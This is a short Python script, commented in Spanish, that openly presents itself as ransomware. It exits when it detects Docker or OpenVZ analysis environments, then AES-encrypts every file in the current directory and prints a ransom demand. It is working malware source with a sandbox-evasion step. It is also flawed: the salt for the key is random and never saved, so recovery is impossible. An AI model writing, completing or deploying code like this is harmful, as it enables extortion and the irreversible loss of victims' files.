import os
import sys
import random
import base64
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2

# Constantes para el tamaño del IV y la clave
IV_SIZE = 16
KEY_SIZE = 32

# Función para verificar si el ransomware está en un entorno de análisis
def is_in_analysis_environment():
    # Verificar si se ejecuta en un sistema virtual
    if os.path.exists("/.dockerenv") or os.path.exists("/proc/vz"):
        return True
    return False

# Función para cifrar archivos
def aes_encrypt_file(filename, key):
    iv = os.urandom(IV_SIZE)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    
    with open(filename, 'rb') as in_file:
        data = in_file.read()
        padded_data = data + b'\0' * (16 - len(data) % 16)  # Rellenar con ceros
        encrypted = cipher.encrypt(padded_data)
        
    with open(filename + ".enc", 'wb') as out_file:
        out_file.write(iv + encrypted)

# Función para generar una clave a partir de una contraseña
def generate_key(password):
    salt = os.urandom(16)
    return PBKDF2(password, salt, KEY_SIZE)

# Función principal
def main():
    # Comprobar si el script está en un entorno de análisis
    if is_in_analysis_environment():
        print("Entorno de análisis detectado. Salida.")
        sys.exit(1)

    password = input("Introduce la contraseña para cifrar: ")
    key = generate_key(password)

    # Cifrar archivos en el directorio actual
    for filename in os.listdir('.'):
        if os.path.isfile(filename) and not filename.endswith(".enc"):
            aes_encrypt_file(filename, key)

    print("Archivos cifrados. ¡Paga el rescate para recuperarlos!")

if __name__ == "__main__":
    main()
